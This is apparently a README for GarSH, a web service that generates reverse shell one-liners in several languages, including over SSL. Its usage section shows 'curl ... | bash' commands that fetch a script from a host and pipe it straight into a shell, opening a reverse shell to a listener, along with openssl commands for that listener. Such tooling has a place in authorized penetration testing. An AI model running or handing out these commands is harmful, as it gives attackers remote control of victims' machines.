# GarSH (Gimme a reverse Shell!).


Web application to generate reverse shell oneliners, based on https://www.npmjs.com/package/reverse-shell


### Reverse shells supported
#### Using basic netcat listener (/[host]/[port]):

- Python
- Perl
- nc
- bash
- nodejs
- ruby
- php


#### SSL Reverse shell (/ssl/[host]/[port]):

You will need openssl, socat or any other listener that supports SSL/TLS.

**Generate certs:**

`openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=NL/ST=null/L=null/O=null/CN=null" -keyout server.key -out server.cer`

**openssl listener:**

`openssl s_server -quiet -key server.key  -cert server.cer -port 8443`



### Usage
`curl http://yourhost/10.10.10.10/4444 | bash`

`curl http://yourhost/ssl/10.10.10.10/8443 | bash`


It will also serve files from ./files folder

`wget http://yourhost/files/somefile`